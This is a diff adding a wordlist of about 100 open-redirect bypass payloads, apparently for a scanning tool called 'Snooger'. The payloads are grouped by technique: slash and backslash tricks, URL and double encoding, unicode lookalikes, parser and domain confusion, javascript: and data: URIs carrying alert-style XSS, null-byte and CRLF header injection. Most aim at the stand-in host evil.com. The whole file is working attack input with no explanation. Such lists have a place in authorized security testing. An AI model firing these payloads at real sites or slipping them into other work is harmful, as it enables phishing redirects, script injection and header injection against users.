@@ -1,0 +1,117 @@
+# Snooger Open Redirect Payloads — 100+ real payloads
+# Categories: Protocol, Backslash, Encoding, Parser Confusion, Whitespace
+# =======================================================================
+
+# === Basic Open Redirect ===
+https://evil.com
+http://evil.com
+//evil.com
+///evil.com
+////evil.com
+/\/evil.com
+\\evil.com
+\\\evil.com
+/\\evil.com
+
+# === Protocol-Relative ===
+//evil.com
+//evil.com/
+//evil.com%2f
+//evil.com%5c
+//evil.com@legitimate.com
+
+# === Backslash Tricks ===
+/\evil.com
+\/\/evil.com
+/\/\/evil.com
+/\evil.com/
+\\evil.com/
+\evil.com
+\@evil.com
+
+# === URL Encoding ===
+%2f%2fevil.com
+%2F%2Fevil.com
+%5c%5cevil.com
+%252f%252fevil.com
+%5c%2f%2fevil.com
+%2f%5cevil.com
+/%09/evil.com
+/%0d/evil.com
+/%0a/evil.com
+%00//evil.com
+
+# === Double URL Encoding ===
+%252f%252fevil.com
+%252F%252Fevil.com
+%25252f%25252fevil.com
+
+# === Unicode / UTF-8 ===
+%e4%b8%8devil.com
+%ef%bc%8f%ef%bc%8fevil.com
+%ef%bc%bc%ef%bc%bcevil.com
+
+# === Parser Confusion ===
+https://evil.com%2f@legitimate.com
+http://legitimate.com.evil.com
+https://evil.com?legitimate.com
+https://evil.com#legitimate.com
+https://evil.com\.legitimate.com
+http://evil.com%40legitimate.com
+http://evil.com%23@legitimate.com
+https://evil.com\@legitimate.com
+http://evil.com:80%40legitimate.com
+https://legitimate.com@evil.com
+http://legitimate.com%40evil.com
+https://legitimate.com%2Fevil.com
+http://legitimate.com:password@evil.com
+https://evil.com%252f@legitimate.com
+
+# === Domain Confusion ===
+http://evil.comlegitimate.com
+https://evil.com/legitimate.com
+http://legitimate.com.evil.com
+https://evil.com%00legitimate.com
+http://evil.com%E3%80%82legitimate.com
+http://evil。com
+https://ⓔⓥⓘⓛ.ⓒⓞⓜ
+https://evil%E3%80%82com
+
+# === JavaScript Protocol ===
+javascript:alert(1)//
+javascript:alert(document.domain)//
+javascript://evil.com/%0aalert(1)
+javascript://legitimate.com/%0d%0aalert(1)
+jaVasCrIpT:alert(1)//
+java%0ascript:alert(1)//
+java%0dscript:alert(1)//
+java%09script:alert(1)//
+java\x0ascript:alert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# === Whitespace / Tab ===
+/	/evil.com
+/ /evil.com
+/
+/evil.com
+http://evil.com	
+//	evil.com
+//evil.com 
+// evil.com
+
+# === Path-Based ===
+/redirect?url=/\/evil.com
+/redirect?url=//evil.com
+/redirect?url=https://evil.com
+/redirect?url=%2f%2fevil.com
+/redirect?url=https%3A%2F%2Fevil.com
+/redirect?url=//evil.com/%2f..
+/redirect?next=http://evil.com
+
+# === Null Byte ===
+/redirect?url=%00//evil.com
+/redirect?url=http://evil.com%00.legitimate.com
+
+# === CRLF Based ===
+/redirect%0d%0aLocation:http://evil.com
+/%0d%0aLocation:%20http://evil.com
